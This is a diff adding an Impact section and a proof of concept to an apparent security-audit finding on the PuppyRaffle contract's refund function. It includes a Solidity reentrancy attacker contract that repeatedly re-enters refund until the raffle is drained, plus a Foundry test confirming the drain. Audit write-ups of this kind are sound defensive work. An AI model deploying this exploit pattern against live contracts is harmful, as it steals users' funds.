@@ -51,7 +51,96 @@ The protocol should do the following:
 
 The vulnerability is embedded within the potential for a reentrancy attack. In this scenario, a hacker could repetitively call the `PuppyRaffle::refund` function until the contract is fully drained of its funds.
 
+**Impact**:
+
 This issue deems Critical severity because a reentrancy attack can end up causing serious damage by draining funds from the contract. Particularly for a contract handling withdrawal functions, this vulnerability exposes the contract to a substantial risk of loss.
+
+**Proof of Concept**:
+
+The below test case shows how the `PuppyRaffleTest::refund` function can be exploited.
+
+1. Copy and paste the following contract to the `test/PuppyRaffleTest.t.sol` file (outside of the `PuppyRaffleTest` contract).
+
+<details>
+<summary>Contract Reentrancy Attacker</summary>
+
+```javascript
+    contract ReentrancyAttaker {
+        PuppyRaffle puppyRaffle;
+        uint256 entranceFee;
+        uint256 attackerIndex;
+
+        constructor(PuppyRaffle _puppyRaffle) {
+            puppyRaffle = _puppyRaffle;
+            entranceFee = puppyRaffle.entranceFee();
+        }
+
+        function attack() external payable {
+            address[] memory players = new address[](1);
+            players[0] = address(this);
+            puppyRaffle.enterRaffle{value: entranceFee}(players);
+            attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+            puppyRaffle.refund(attackerIndex);
+        }
+
+        function _reentrancy() internal {
+            if (address(puppyRaffle).balance >= entranceFee) {
+                puppyRaffle.refund(attackerIndex);
+            }
+        }
+
+        fallback() external payable {
+            _reentrancy();
+        }
+
+        receive() external payable {
+            _reentrancy();
+        }
+    }
+```
+</details>
+
+2. Copy and paste the following unit test into your `PuppyRaffleTest` contract:
+
+<details>
+<summary>Unit test Reentrancy Attack `refund`</summary>
+
+```javascript
+    function test_reentrancyAttack_refund() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        ReentrancyAttaker attackerContract = new ReentrancyAttaker(puppyRaffle);
+        address attackUser = makeAddr("attackUser");
+        vm.deal(attackUser, 1 ether);
+
+        uint256 startingAttackContractBalance = address(attackerContract).balance;
+        uint256 startingContractBalance = address(puppyRaffle).balance;
+
+        vm.startPrank(attackUser);
+        attackerContract.attack{value: entranceFee}();
+
+        console2.log("starting attacker contract balance: ", startingAttackContractBalance);
+        console2.log("starting contract balance: ", startingContractBalance);
+
+        console2.log("ending attacker contract balance: ", address(attackerContract).balance);
+        console2.log("ending contract balance: ", address(puppyRaffle).balance);
+
+        assertEq(address(puppyRaffle).balance, 0,"Contract should be drained after attack");
+        assertEq(address(attackerContract).balance, startingContractBalance + entranceFee,"Attacker contract should be fulled after attack");
+    }
+```
+</details>
+
+3. Run the tests:
+```bash
+forge test --mt test_reentrancyAttack_refund -vvv
+```
+
 
 **Recommended Mitigation**:
 
